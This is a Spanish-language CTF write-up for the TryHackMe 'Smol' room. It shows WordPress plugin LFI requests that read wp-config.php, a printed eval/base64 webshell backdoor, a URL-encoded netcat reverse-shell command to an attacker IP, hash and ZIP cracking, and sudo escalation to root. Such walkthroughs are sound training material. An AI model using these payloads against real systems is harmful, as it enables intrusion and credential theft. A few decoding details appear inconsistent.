# 💻 Escribiendo el Writeup para el CTF: Smol (TryHackMe)

## Introducción

La sala **Smol** es una sala de dificultad media que contiene muchos detalles. En esta sala hackeamos un servidor Linux con **WordPress**. Tenemos una vulnerabilidad de **LFI (Local File Inclusion)** y una de **RCE (Remote Code Execution)** en 2 *plugins* diferentes de WordPress.

***

## ⚙️ Paso 1: Reconocimiento (Ping)

El primer paso en cualquier prueba de penetración o CTF es el reconocimiento para asegurarnos de que el objetivo está activo y para medir la conectividad de la red.

### 📝 Objetivo
Verificar la conectividad con la máquina objetivo y medir la latencia.

### 🛠 Herramienta Utilizada
**ping**

### 🧑‍💻 Comando Ejecutado
Utilizamos el comando `ping` con el flag `-c 4` para enviar exactamente 4 paquetes ICMP de solicitud de eco a la dirección IP objetivo, en este caso, **10.10.194.146**.

<img width="579" height="246" alt="Ping" src="https://github.com/user-attachments/assets/7d7a71b0-868e-4bc2-ac11-33bea6d4c877" />

```bash
$ ping -c 4 10.10.194.146
````
🖥 Salida y Análisis
La salida del comando ping confirma que la máquina objetivo está activa y es accesible:

Paquetes Transmitidos/Recibidos: Se transmitieron 4 paquetes y se recibieron 4, resultando en un 0% de pérdida de paquetes. Esto indica una conexión de red estable.

Tiempo (TTL/Latencia): El Time To Live (TTL) de 63 (un valor común para sistemas operativos Linux que tienen un TTL inicial de 64) y los tiempos de ida y vuelta (RTT) promedio de 54.965 ms confirman que la máquina está respondiendo. La latencia es aceptable para continuar con el escaneo de puertos.

Resultado: La máquina está online. Procedemos al escaneo de puertos.

## 🔍 Paso 2: Escaneo de Puertos (Nmap)

Una vez que hemos confirmado que la máquina está activa, procedemos a realizar un escaneo de puertos para identificar los servicios que se están ejecutando en la máquina objetivo y sus versiones.

### 📝 Objetivo
Identificar los puertos abiertos, los servicios que se ejecutan en ellos y la versión del software.

### 🛠 Herramienta Utilizada
**Nmap** (Network Mapper)

### 🧑‍💻 Comando Ejecutado
Utilizamos un comando de Nmap completo para un escaneo agresivo:

<img width="910" height="359" alt="Nmap" src="https://github.com/user-attachments/assets/bc011f87-81eb-49d4-986b-1ea21c7a02b2" />

* `-T4`: Configura la temporización para ser más rápida, pero aún confiable.
* `-n`: No resuelve DNS (más rápido).
* `-p-`: Escanea todos los 65535 puertos.
* `-sC`: Ejecuta los *scripts* por defecto de Nmap (para detección básica y vulnerabilidades).
* `-sV`: Realiza la detección de la versión del servicio.
* `-oA`: (Aunque no se ve en la captura, se recomienda para guardar la salida).

```bash
$ nmap -T4 -n -sC -sV -p- 10.10.194.146
````
Nota: La captura de pantalla muestra un escaneo con -Pn (tratar al host como activo), -sC, y -sV, lo cual también es un buen enfoque.

Detalles Clave del Puerto 80:

Título HTTP: Nmap detecta que la respuesta HTTP no redirige a http://www.smol.thm.

Encabezado del Servidor: Apache/2.4.41 (Ubuntu).

Resultado: El puerto 80 (HTTP) es el foco principal para la enumeración inicial, ya que el servicio SSH requiere credenciales. Procederemos a explorar el sitio web.

## 🌐 Paso 3: Configuración del Archivo Hosts y Primera Exploración Web

Aunque el escaneo de Nmap sugirió que el sitio podría funcionar sin un nombre de host específico, es una buena práctica y a menudo necesario configurar el archivo `/etc/hosts` para mapear la dirección IP a cualquier nombre de dominio asociado. Esto es crucial cuando el servidor web utiliza *Virtual Hosts*.

### 📝 Objetivo
1.  Mapear la IP objetivo (10.10.194.146) al nombre de dominio sugerido por la sala o deducido (`smol.thm`).
2.  Visitar el sitio web y determinar la tecnología de la plataforma.

### 🛠 Herramienta Utilizada
**GNU nano** (para editar `/etc/hosts`) y un **navegador web**.

### 🧑‍💻 Edición del Archivo Hosts
Se añade la siguiente línea al archivo `/etc/hosts`:

```bash
# Contenido añadido a /etc/hosts
10.10.194.146 smol.thm
````
<img width="442" height="225" alt="agrego el sitio a hosts" src="https://github.com/user-attachments/assets/03feb45c-5205-4c79-98c0-218836b348c4" />

🖥 Exploración del Sitio Web
Al acceder al sitio a través del navegador web usando el nombre de dominio configurado (http://smol.thm/), la página principal se carga correctamente.

<img width="1707" height="943" alt="visitamos sitio p80 wordpress" src="https://github.com/user-attachments/assets/78af3c1e-b17d-4c34-87c8-b1db1e902d85" />

Hallazgo Clave:
En la parte inferior de la página, se encuentra el indicio crucial:

"Proudly powered by WordPress"

Resultado: La máquina objetivo está ejecutando una instancia de WordPress. Este hallazgo cambia el enfoque de nuestra enumeración hacia la identificación de posibles vulnerabilidades en temas, plugins o en la configuración de esta plataforma de gestión de contenido (CMS). El siguiente paso será enumerar la instalación de WordPress.

## 🔎 Paso 4: Enumeración de WordPress con WPScan

Con la confirmación de que la máquina ejecuta **WordPress**, utilizamos **WPScan** para automatizar la detección de la versión de WordPress, temas y, lo más importante, *plugins* potencialmente vulnerables.

### 📝 Objetivo
Identificar *plugins* instalados y buscar vulnerabilidades conocidas asociadas a ellos.

### 🛠 Herramienta Utilizada
**WPScan**

### 🧑‍💻 Escaneo de Plugins y Detección
El escaneo reveló la presencia del *plugin* llamado **jsmol2wp**:


| Plugin | Versión | Ruta |
| :---: | :---: | :--- |
| **jsmol2wp** | **1.07** | `http://www.smol.thm/wp-content/plugins/jsmol2wp/` |

<img width="621" height="268" alt="scaneo con wpscan plugin vulnerable" src="https://github.com/user-attachments/assets/f84711e2-5805-4192-8020-ee93299f39bd" />

### 📚 Búsqueda de Vulnerabilidades

La versión **1.07** del *plugin* `jsmol2wp` fue el foco de la investigación. Al buscar vulnerabilidades conocidas (CVEs o entradas en la base de datos de WPScan) para esta versión, se encontraron al menos dos fallos de seguridad críticos:

#### 1. Server Side Request Forgery (SSRF) No Autenticada

* **Vulnerabilidad:** **SSRF No Autenticada** en la versión **<= 1.07** de **JSmol2WP**.
* **Impacto:** Permite a un atacante no autenticado forzar al servidor a hacer solicitudes a otros recursos de red, que pueden ser internos (Lectura de archivos locales o acceso a servicios internos) o externos.
* **Prueba de Concepto (PoC) Relevante:** El PoC sugiere la posibilidad de leer archivos locales (como el archivo de configuración de WordPress) a través de un *wrapper* de protocolo:
    ```
    .../wp-content/plugins/jsmol2wp/php/jsmol.php?isform=true&call=getRawDataFromDatabase&query=php://filter/resource=../../../../wp-config.php
    ```
    
<img width="1409" height="448" alt="vulnerabilidad ssrf" src="https://github.com/user-attachments/assets/be60f5cb-d9b8-4cc5-b65d-ce7bd156b491" />

#### 2. Cross-Site Scripting (XSS) No Autenticada

* **Vulnerabilidad:** **XSS No Autenticada** en la versión **<= 1.07** de **JSmol2WP**.
* **Impacto:** Permite la inyección de código *script* malicioso en páginas web visualizadas por otros usuarios (por ejemplo, un administrador), lo que podría conducir al robo de *cookies* o a la ejecución de acciones.
* 
<img width="1322" height="402" alt="vulnerabilidad xss" src="https://github.com/user-attachments/assets/fd4d0011-70b4-4ca0-8bed-0e134f886354" />

**Decisión:** La vulnerabilidad de **SSRF/LFI** (Lectura de Archivos Locales a través del *wrapper* `php://filter`) es el camino más directo para obtener credenciales, ya que **`wp-config.php`** a menudo contiene las credenciales de la base de datos.

**Resultado:** Se ha identificado el *plugin* vulnerable **jsmol2wp** y se priorizará la explotación de la vulnerabilidad **SSRF/LFI** para la lectura de archivos.

## 🔓 Paso 5: Explotación de LFI/SSRF y Acceso a WordPress

Con la vulnerabilidad de Server Side Request Forgery (SSRF) en el *plugin* `jsmol2wp` confirmada, el objetivo inmediato es explotarla para obtener las credenciales de la base de datos que se encuentran en el archivo `wp-config.php`.

### 📝 Objetivo
1.  Explotar la vulnerabilidad para leer el contenido del archivo `wp-config.php`.
2.  Extraer las credenciales de la base de datos.
3.  Usar las credenciales para acceder al panel de administración de WordPress.

### 🧑‍💻 Explotación de la Vulnerabilidad
Utilizamos la sintaxis de la Prueba de Concepto (PoC) encontrada, aprovechando el *wrapper* `php://filter` para leer el archivo de configuración.

#### Petición (LFI/SSRF):

```url
[http://smol.thm/wp-content/plugins/jsmol2wp/php/jsmol.php?isform=true&call=getRawDataFromDatabase&query=php://filter/resource=../../../../wp-config.php](http://smol.thm/wp-content/plugins/jsmol2wp/php/jsmol.php?isform=true&call=getRawDataFromDatabase&query=php://filter/resource=../../../../wp-config.php)
````
🖥 Salida y Extracción de Credenciales
La petición fue exitosa y devolvió el contenido completo del archivo wp-config.php.

Del archivo, extraemos las credenciales de la base de datos:
````
Detalle,Nombre de la Variable,Valor
Usuario DB,DB_USER,wpuser
Contraseña DB,DB_PASSWORD,KbLSF2YopefW3rJZGZG9aZGG
````

🔑 Intento de Inicio de Sesión

A menudo, las credenciales de la base de datos se reutilizan para un usuario de WordPress. Intentamos iniciar sesión en el panel de administración (/wp-login.php) usando wpuser y la contraseña obtenida.

Usuario: wpuser

Contraseña: KbLSF2YopefW3rJZGZG9aZGG

Acceso Exitoso

El intento de inicio de sesión fue exitoso, y se nos redirigió al Dashboard (Panel de Control) de WordPress.

Resultado: Hemos obtenido acceso como un usuario válido (probablemente administrador) y ahora tenemos la capacidad de ejecutar acciones dentro del CMS, lo que nos acerca a obtener un shell en la máquina. El siguiente paso será buscar una vulnerabilidad para obtener RCE (Ejecución de Código Remoto) o subir un shell.

## 🕵️ Paso 6: Detección y Explotación de la Backdoor Oculta

Una vez que tuvimos acceso al panel de administración, el enfoque pasó a obtener una *shell* en el sistema. En lugar de utilizar las vulnerabilidades típicas de subida de *shells* o edición de temas, una enumeración más profunda de los archivos y publicaciones del CMS reveló un camino oculto.

### 📝 Objetivo
1.  Encontrar indicios de una *backdoor* en las publicaciones o archivos del sistema.
2.  Utilizar la vulnerabilidad LFI/SSRF para leer el código fuente de los *plugins* en busca de código malicioso.
3.  Decodificar y explotar la *backdoor* para obtener Ejecución de Código Remoto (RCE).

### 1. Indicio de la Backdoor (Webmaster Tasks)
Al explorar las páginas y publicaciones del sitio web, se encontró una publicación titulada **"Webmaster Tasks!!"** que hacía una referencia muy específica a una posible *backdoor*.

<img width="1547" height="781" alt="entro en tareas pendientes y mencionan una backdoor" src="https://github.com/user-attachments/assets/6b43812e-c447-46fe-be11-43a061250e0e" />

La instrucción clave es: **`[IMPORTANT] Check Backdoors: Verify the SOURCE CODE of "Hello Dolly" plugin as the site's code revision.`**

### 2. Lectura del Código Fuente del Plugin
Siguiendo la pista, utilizamos la misma vulnerabilidad LFI/SSRF del Paso 5 para leer el código del *plugin* **Hello Dolly**, que se encuentra en la ruta `/wp-content/plugins/hello.php`.

<img width="1571" height="846" alt="ahora tuilizando lfi accedo al codigo de hello" src="https://github.com/user-attachments/assets/7bcf8287-68e0-495d-a7dc-f468dc2f3dc6" />

#### Petición (LFI para código fuente):

```url
[http://smol.thm/wp-content/plugins/jsmol2wp/php/jsmol.php?isform=true&call=getRawDataFromDatabase&query=php://filter/resource=../../../../wp-content/plugins/hello.php](http://smol.thm/wp-content/plugins/jsmol2wp/php/jsmol.php?isform=true&call=getRawDataFromDatabase&query=php://filter/resource=../../../../wp-content/plugins/hello.php)
````
En la parte inferior del código del plugin se encontró una línea de código ofuscado:
````
function smolhack() { eval(base64_decode('CiBifCAgaXNzZXQoJF9HRVNbInB0cCJdKSB7IHN5c3RlbSg...')); }; smolhack();
````

3. Decodificación de la Backdoor

El código ofuscado estaba codificado en Base64. Procedimos a decodificarlo en el terminal:

<img width="1024" height="74" alt="decodificando encontramos la backdorr" src="https://github.com/user-attachments/assets/acb93ac4-79e4-421a-9ae6-6eb932b96d2c" />

````
$ echo 'CiBifCAgaXNzZXQoJF9HRVNbInB0cCJdKSB7IHN5c3RlbSg...KbLSF2YopefW3rJZGZG9aZGG' | base64 -d

# Resultado (Decodificado):
if (isset($_GET["\143\155\x64"])) { system($_GET["\143\x6d\144"]); }
````
La backdoor es un webshell simple que utiliza variables codificadas. Decodificamos las variables para obtener los nombres de los parámetros:

<img width="459" height="72" alt="decodificamos las variables" src="https://github.com/user-attachments/assets/669ad0a4-38d1-404d-b96f-bab1a83066c5" />

````
$ php -r 'echo "\143\155\x64" . ":" . "\143\x6d\144";'
# Resultado:
cmd:cmd
````
El código de la backdoor final es:
````
if (isset($_GET["cmd"])) { system($_GET["cmd"]); }
````

## 🐚 Paso 7: Obtención de la Reverse Shell

Habiendo confirmado la Ejecución de Código Remoto (RCE) a través de la *backdoor* en el *plugin* **Hello Dolly**, el siguiente objetivo es escalar a una **Reverse Shell** interactiva en la máquina atacante (Kali).

### 📝 Objetivo

Utilizar la capacidad de RCE para ejecutar un comando que fuerce al servidor objetivo a conectarse de vuelta a nuestra máquina.

### 1. Configuración del Listener

En la máquina atacante (Kali), se configura un *listener* (escuchador) usando `netcat` en un puerto específico (en este caso, **4444**) para esperar la conexión entrante.

```bash
$ nc -lvnp 4444
listening on [0.0.0.0] 4444 ...
````
2. Generación del Comando de Reverse Shell

Se utiliza una herramienta de generación de shells (como la mostrada en la captura) para crear un comando de reverse shell que se adapte a la sintaxis del RCE, codificado en URL para la petición HTTP. El comando de shell utilizado es a menudo una variante de netcat o bash.

<img width="1146" height="679" alt="genero un reverseshell" src="https://github.com/user-attachments/assets/98234dce-a748-401d-958a-8b5d9676ff8b" />

El comando codificado se utiliza junto con la backdoor RCE:

IP del atacante (Kali): 10.8.24.253

Puerto del Listener: 4444

Comando de shell (Codificado en URL):
````
rm%2Ftmp%2Ff%3Bmkfifo%2Ftmp%2Ff%3Bcat%20%2Ftmp%2Ff%7Csh%20-i%202%3E%261%7Cnc%2010.8.24.253%204444%20%3E%2Ftmp%2Ff
````
3. Ejecución y Recepción de la Shell

El comando codificado se inyecta en la URL de la backdoor a través del parámetro cmd:
````
[http://smol.thm/wp-content/plugins/hello.php?cmd=rm%2Ftmp%2Ff%3Bmkfifo%2Ftmp%2Ff%3Bcat%20%2Ftmp%2Ff%7Csh%20-i%202%3E%261%7Cnc%2010.8.24.253%204444%20%3E%2Ftmp%2Ff](http://smol.thm/wp-content/plugins/hello.php?cmd=rm%2Ftmp%2Ff%3Bmkfifo%2Ftmp%2Ff%3Bcat%20%2Ftmp%2Ff%7Csh%20-i%202%3E%261%7Cnc%2010.8.24.253%204444%20%3E%2Ftmp%2Ff)
````
Tras ejecutar la petición en el navegador, el listener en Kali recibe la conexión.
````
$ nc -lvnp 4444
listening on [10.8.24.253] 4444
connect to [10.10.194.146] 38798
sh: 0: can't access tty; job control turned off
$ whoami
www-data
````
<img width="1334" height="857" alt="ejecuto el reveser y oibtengo shell" src="https://github.com/user-attachments/assets/e4d19b70-756e-4d41-a246-054b40a58361" />

Resultado: Se ha obtenido una reverse shell de baja integridad en la máquina objetivo, ejecutándose como el usuario del servidor web, www-data. Ahora podemos proceder con la enumeración y escalada de privilegios (Privilege Escalation).

## 🔒 Paso 8: Estabilización de la Shell y Extracción de Credenciales de WordPress

Una vez obtenida la *reverse shell* como el usuario `www-data`, el primer paso crucial es estabilizarla para permitir una mejor interacción (uso de flechas, comandos de edición, `clear`, etc.). El segundo paso natural es utilizar las credenciales de la base de datos ya descubiertas para acceder a la tabla de usuarios de WordPress y buscar otras credenciales valiosas.

### 📝 Objetivo
1.  Estabilizar la *reverse shell* para una mejor usabilidad.
2.  Conectarse a la base de datos MySQL de WordPress.
3.  Extraer los hashes de contraseñas de todos los usuarios de WordPress.

### 1. Estabilización de la Shell
Se utiliza Python para spawnear una *TTY shell* completa y luego se configura la variable `TERM` para una mejor emulación de terminal.

<img width="637" height="139" alt="estabilizo shell" src="https://github.com/user-attachments/assets/df5fda5e-d404-4809-bd37-22bcaf15b570" />

```bash
$python3 -c 'import pty;pty.spawn("/bin/bash");'$ export TERM=xterm
````
Resultado: Se tiene una shell interactiva en el servidor, confirmando que somos el usuario www-data.

2. Conexión a la Base de Datos MySQL
Utilizamos las credenciales de la base de datos (DB_USER: wpuser, DB_PASSWORD: KbLSF2YopefW3rJZGZG9aZGG) que extrajimos del archivo wp-config.php en el Paso 5 para conectarnos a MySQL.

<img width="1046" height="530" alt="me conecto con mysql y obtengo los users y pass" src="https://github.com/user-attachments/assets/9769728c-8805-45d8-8a37-7403f8ff18c7" />

🧑‍💻 Comando de Conexión:
````
mysql -u wpuser -p'KbLSF2YopefW3rJZGZG9aZGG' -D wordpress
````
3. Extracción de Usuarios y Hashes
Dentro del monitor de MySQL, se ejecuta una consulta para seleccionar los nombres de usuario (user_login) y los hashes de contraseña (user_pass) de la tabla wp_users.

🧑‍💻 Consulta SQL:
````
select user_login,user_pass from wp_users;
````

Resultado: Se han obtenido 6 hashes de contraseñas.

## 🎯 Paso 9: Cracking de Hashes y Acceso al Usuario `diego`

Con los *hashes* de las contraseñas de los usuarios de WordPress en nuestro poder, el siguiente paso es intentar crackearlos utilizando una herramienta de fuerza bruta o diccionario. Si un usuario de WordPress tiene una cuenta de usuario local en el sistema, podremos realizar una escalada horizontal de `www-data` a ese usuario.

### 📝 Objetivo
1.  Crackear los *hashes* de contraseñas de la base de datos de WordPress.
2.  Utilizar la contraseña crackeada para cambiar de usuario (`su`) a una cuenta local en el sistema.
3.  Obtener el *flag* de usuario (`user.txt`).

### 1. Cracking de Hashes con John The Ripper
Los *hashes* extraídos de la base de datos se guardan en un archivo (por ejemplo, `hashes.txt`) y se utiliza **John The Ripper** junto con un diccionario conocido (`rockyou.txt`) para el ataque de diccionario.

<img width="841" height="190" alt="obetngo clave del usuario diego" src="https://github.com/user-attachments/assets/98832ebf-892f-4b45-805a-aecf82fb9fba" />

#### 🧑‍💻 Comando de Cracking:

```bash
$ john hashes.txt --wordlist=/home/quiqu3h4ck/rockyou.txt
````
🔑 Contraseña Crackeada:
El proceso de cracking revela una contraseña en texto plano:
````
Usuario, Contraseña Crackeada
diego, sandiegocalifornia
````
2. Escalada Horizontal al Usuario diego
Una vez obtenida la contraseña de diego, intentamos cambiar de usuario en la shell que tenemos como www-data a este nuevo usuario.

<img width="589" height="189" alt="entro al usuario diego y obtengo flag user" src="https://github.com/user-attachments/assets/78663b22-7ab4-409e-a606-9622f2553117" />

🧑‍💻 Comando de Cambio de Usuario:
````
www-data@ip-10-10-194-146:/var/www/wordpress/wp-admin$ su - diego
Password: sandiegocalifornia
````
El cambio de usuario fue exitoso, dándonos acceso a la shell del usuario diego.

3. Obtención del Flag de Usuario
En el directorio home del usuario diego, se encuentra el primer flag de la máquina.
````
diego@ip-10-10-194-146:~$ ls
user.txt
diego@ip-10-10-194-146:~$ cat user.txt
45edaec653ff[...]
````
Resultado: Hemos escalado exitosamente al usuario diego y obtenido el User Flag. El siguiente paso es la enumeración para la escalada de privilegios a root (Privilege Escalation).

## 🗝️ Paso 10: Enumeración de Usuarios y Descubrimiento de Clave SSH Privada

Una vez dentro como el usuario `diego`, el objetivo es buscar cualquier archivo o configuración inusual que pueda llevar a la Escalada de Privilegios (`root`) o a la Escalada Horizontal a otro usuario con más permisos.

### 📝 Objetivo
1.  Enumerar los usuarios existentes y sus permisos.
2.  Buscar archivos sensibles en los directorios de los usuarios.

### 1. Enumeración Inicial de Usuarios y Grupos
Comenzamos revisando el propio usuario `diego` y el contenido del directorio `/home`.

<img width="577" height="263" alt="vemos privilegios de diego y carpetas" src="https://github.com/user-attachments/assets/c50ec7f7-59ed-4ccc-b0b4-015ccbf8bbb5" />

* **Grupos de `diego`:** El usuario `diego` pertenece al grupo **`internal`** (GID 1005), lo cual puede ser relevante para permisos en archivos compartidos.
* **Usuarios en `/home`:** Observamos varios directorios de usuario: `diego`, `gege`, `ssm-user`, **`think`**, `ubuntu`, y `xavi`.

### 2. Búsqueda de Archivos Sensibles
Decidimos enumerar los directorios de los otros usuarios, centrándonos en buscar archivos a los que `diego` pueda tener acceso de lectura, especialmente en relación con SSH o permisos de sudo.

Al inspeccionar el directorio del usuario **`think`** (`/home/think`), se encontraron archivos de configuración potencialmente sensibles.

#### Hallazgos en `/home/think/.ssh`:

Al listar el contenido del directorio `.ssh` del usuario `think`, encontramos la clave SSH privada:

<img width="637" height="574" alt="buscando en los directorios encontramos clabe ssh" src="https://github.com/user-attachments/assets/79b3390b-1a2d-4521-a51c-fab98c8b8a88" />

```bash
diego@ip-10-10-194-146:~$ ls -la /home/think/.ssh/
total 20
drwx------ 2 think internal 4096 Jun 21 2023 .
drwxr-xr-x 5 think internal 4096 Jan 12 2024 ..
-rw-r--r-- 1 think internal 572 Jun 21 2023 authorized_keys
-rw-r--r-- 1 think internal 2602 Jun 21 2023 **id_rsa**
-rw-r--r-- 1 think internal 572 Jun 21 2023 id_rsa.pub
````
El archivo id_rsa es una clave privada SSH. El usuario diego tiene permisos de lectura (-rw-r--r--) sobre este archivo, ya que el grupo al que pertenece (internal) es el mismo que el grupo de think.

Resultado: Hemos encontrado la clave privada SSH del usuario think. Esto nos permitirá iniciar sesión directamente como think a través de SSH (Puerto 22), evitando tener que crackear su hash. El siguiente paso es transferir la clave a nuestra máquina y utilizarla para la Escalada Horizontal.

## ➡️ Paso 11: Escalada Horizontal a `think` y Enumeración de Usuarios

Habiendo obtenido la clave privada SSH (`id_rsa`) del usuario **`think`** en el directorio de `diego`, el siguiente paso es asegurar una *shell* más estable y con un usuario de mayor jerarquía.

### 📝 Objetivo
1.  Utilizar la clave SSH para iniciar sesión directamente como `think`.
2.  Estabilizar la *shell* y realizar una enumeración inicial como el nuevo usuario.

### 1. Acceso Vía SSH como `think`
Primero, se debe copiar la clave privada (`/home/think/.ssh/id_rsa`) a nuestra máquina Kali, asegurarle los permisos correctos (`chmod 600`), y luego usarla para iniciar sesión. Sin embargo, en la captura, se demuestra que se pudo usar la clave directamente desde la *shell* de `diego` (escala local).

<img width="709" height="679" alt="entramos a think por ssh" src="https://github.com/user-attachments/assets/b061510c-9d29-4de5-881e-0b6672d8aec3" />

#### 🧑‍💻 Comando de Acceso:
Se utiliza la clave encontrada para acceder por SSH al servidor.

```bash
ssh -i /home/think/.ssh/id_rsa think@10.10.194.146
````
Resultado: Se logra el acceso exitoso como el usuario think.
````
think@ip-10-10-194-146:~$ id
uid=1000(think) gid=1000(think) groups=1000(think),1004(dev),1005(internal)
````

2. Enumeración de Usuarios y Grupos
Ya como think, se realiza la enumeración inicial para buscar rutas de escalada a root o a otros usuarios.

🔎 Análisis del Archivo /etc/passwd
Se examina el archivo /etc/passwd para obtener una visión general de los usuarios del sistema.

<img width="313" height="495" alt="podemos iniciar gon gege sin pass" src="https://github.com/user-attachments/assets/a21dd4c4-b890-4ed4-bb36-1a1ec9e9493c" />

Un análisis detallado de las entradas en /etc/passwd y los grupos en /etc/group (donde se observa que think y gege comparten el grupo internal) puede llevar al descubrimiento de una posible debilidad de permisos o de configuración.

Al revisar la configuración de las cuentas, se descubre la posibilidad de cambiar a otro usuario sin necesidad de una contraseña.

💡 Descubrimiento de su sin Contraseña:
A menudo, en las salas de CTF, cuando un usuario no tiene un sudo -l evidente, la vulnerabilidad puede ser la posibilidad de cambiar a otro usuario (su) si el campo de contraseña en /etc/shadow está vacío o la configuración del sistema lo permite para usuarios específicos.

Resultado: El siguiente paso es verificar esta posibilidad de iniciar sesión como gege sin contraseña (o con una muy sencilla, como una null password), ya que esta puede ser una pista importante para la escalada de privilegios.

## 📦 Paso 12: Escalada a `gege` y Descubrimiento de Archivo Cifrado

Desde la *shell* del usuario `think`, procedemos a la escalada horizontal al usuario **`gege`**, basándonos en la enumeración previa y la relación de grupos.

### 📝 Objetivo
1.  Cambiar al usuario `gege`.
2.  Enumerar el directorio *home* de `gege`.
3.  Descargar el archivo `.zip` encontrado para su análisis en la máquina atacante.

### 1. Escalada Horizontal a `gege`
Se intenta cambiar de usuario (`su`) a `gege`.

```bash
think@ip-10-10-194-146:~$ su - gege
su - gege
gege@ip-10-10-194-146:~$ id
uid=1003(gege) gid=1003(gege) groups=1003(gege),1004(dev),1005(internal)
````
Resultado: El cambio de usuario a gege fue exitoso, presumiblemente sin contraseña (o con una contraseña trivial/vacía, lo cual se debe notar). Esto confirma que gege es un usuario con una configuración de seguridad débil.

<img width="639" height="338" alt="dentro de gege vemos un zip" src="https://github.com/user-attachments/assets/e053a7ed-b52d-4833-9521-23d6765d00d5" />

2. Enumeración del Directorio Home de gege
Una vez como gege, inspeccionamos su directorio /home/gege.

Se encuentra un archivo grande y sospechoso: wordpress.old.zip.
````
gege@ip-10-10-194-146:~$ ls -la /home/gege
...
-rw-rwxr-x 1 root gege 32266546 Aug 16 2023 wordpress.old.zip
````
Permisos Clave: El archivo tiene permisos de lectura para el grupo gege (el usuario gege puede leerlo) y pertenece al usuario root. Este es un archivo de interés para la escalada de privilegios.

3. Descarga del Archivo ZIP
Para analizar el contenido del ZIP de forma segura y sin dejar rastros en el servidor, lo descargamos a la máquina atacante.

<img width="1531" height="856" alt="me descargo el zip pero tiene clave" src="https://github.com/user-attachments/assets/0ddd3705-e718-488a-ab6a-a1668849589b" />

🧑‍💻 Proceso de Descarga:
Se inicia un servidor web simple en la máquina objetivo desde el directorio del archivo (si es necesario) o se utiliza otro método como wget si hay un servidor web expuesto. En este caso, se asume que se pudo descargar a través de una petición web al endpoint del servidor de WordPress (o un servidor Python).

Desde Kali, se usa wget para descargarlo.
````
# En el servidor objetivo (gege)
python3 -m http.server 8080 
# (Asumiendo que el firewall permite este puerto o se usa el servidor existente)

# En la máquina atacante (Kali)
$ wget [http://smol.thm:8080/wordpress.old.zip](http://smol.thm:8080/wordpress.old.zip)
````
Intento de Extracción:
Al intentar descomprimir el archivo descargado (wordpress.old.zip) con unzip, se solicita una contraseña.
````
$ unzip wordpress.old.zip
Archive: wordpress.old.zip
creating: wordpress.old/
...
[wordpress.old/wp-config.php] password:
````
Resultado: El archivo ZIP está cifrado. El siguiente paso es crackear la contraseña del archivo ZIP para obtener su contenido, que probablemente contenga la clave para la escalada a root.

## 👑 Paso 13: Cracking del Archivo ZIP y Acceso a Root

El archivo cifrado `wordpress.old.zip` encontrado en el *home* de `gege` es el último eslabón para la escalada de privilegios a `root`.

### 📝 Objetivo
1.  Crackear la contraseña del archivo ZIP cifrado.
2.  Extraer el contenido para obtener nuevas credenciales.
3.  Utilizar las credenciales para la Escalada de Privilegios final.

### 1. Cracking de la Contraseña del ZIP
Utilizamos la utilidad `zip2john` para convertir el archivo ZIP en un *hash* compatible con John The Ripper, y luego atacamos ese *hash* con un diccionario.

#### 🧑‍💻 Proceso de Cracking:

<img width="807" height="189" alt="me creo con zip2john el archivo y luego descifro con john" src="https://github.com/user-attachments/assets/cd00236d-565d-44b1-9bab-b9fbb2b508f8" />

1.  **Crear el Hash:** `zip2john wordpress.old.zip > archive_hash`
2.  **Crackear con John:**

```bash
$ john archive_hash --wordlist=/home/quiqu3h4ck/rockyou.txt
````

🔑 Contraseña Crackeada:
El cracking fue exitoso y reveló la contraseña del archivo ZIP: hero_gege@hotmail.com.

2. Descompresión y Extracción de Credenciales
Utilizamos la contraseña descubierta para descomprimir el archivo ZIP. Luego, examinamos el archivo wp-config.php dentro del directorio extraído (wordpress.old/).

<img width="585" height="671" alt="descomprimo el zip y dentro del archivo wpcongin clvaves" src="https://github.com/user-attachments/assets/edff2b91-9916-4e4d-a864-2b8cbdd99362" />

📝 Credenciales Encontradas:
Este archivo de configuración antiguo revela un nuevo par de credenciales de la base de datos:
````
Detalle, Valor
Usuario DB, xavi
Contraseña DB, P@ssw0rdxavi@)
````
Análisis: Al igual que con diego, se asume que este usuario de la base de datos (xavi) podría tener una cuenta de usuario local con la misma contraseña. Este patrón de reutilización es común en la sala.

## 🏆 Paso 14: Escalada de Privilegios Final a `root`

La contraseña **`P@ssw0rdxavi@)`**, obtenida del archivo ZIP crackeado, nos proporciona acceso al usuario **`xavi`**, el cual resulta ser el punto de escalada final.

### 📝 Objetivo
1.  Cambiar al usuario `xavi`.
2.  Enumerar los permisos `sudo` de `xavi`.
3.  Utilizar los permisos de `sudo` para obtener una *shell* de `root` y el *flag* final.

### 1. Escalada Horizontal a `xavi`
Utilizamos la contraseña recién crackeada para cambiar de usuario desde la *shell* de `gege` o `diego`.

<img width="783" height="298" alt="entramos como xavi y tiene todos los permiss" src="https://github.com/user-attachments/assets/6a48e4bb-f444-48d0-8dd1-f6b5cc15edc2" />

```bash
gege@ip-10-10-194-146:~$ su - xavi
Password: P@ssw0rdxavi@)
xavi@ip-10-10-194-146:~$ id
uid=1001(xavi) gid=1001(xavi) groups=1001(xavi),1005(internal)
````
2. Detección de Permisos de sudo
Una vez como xavi, comprobamos sus permisos de sudo con el comando sudo -l.

💡 Hallazgo Clave:
La salida de sudo -l es extremadamente permisiva:
````
User xavi may run the following commands on ip-10-10-194-146:
(ALL : ALL) ALL
````
Esto significa que el usuario xavi puede ejecutar cualquier comando (ALL) como cualquier usuario (ALL) sin necesidad de contraseña, incluyendo root. Esta es una vulnerabilidad de configuración de permisos grave.

3. Obtención del Shell de root y Root Flag
Utilizamos el permiso de sudo para ejecutar el comando su - (switch user) como root.

<img width="490" height="152" alt="cambiamos a root y obtenemos la flag root" src="https://github.com/user-attachments/assets/2f71ee64-6dcb-4cb2-9061-4053fb46626d" />

🧑‍💻 Comandos Finales:
````
xavi@ip-10-10-194-146:~$ sudo su -
root@ip-10-10-194-146:~$ id
uid=0(root) gid=0(root) groups=0(root)
````
Resultado: ¡Acceso como root obtenido!

Finalmente, procedemos a leer el flag final en el directorio /root.
````
root@ip-10-10-194-146:~$ cat /root/root.txt
bf89[...]
````
¡Máquina Completada!
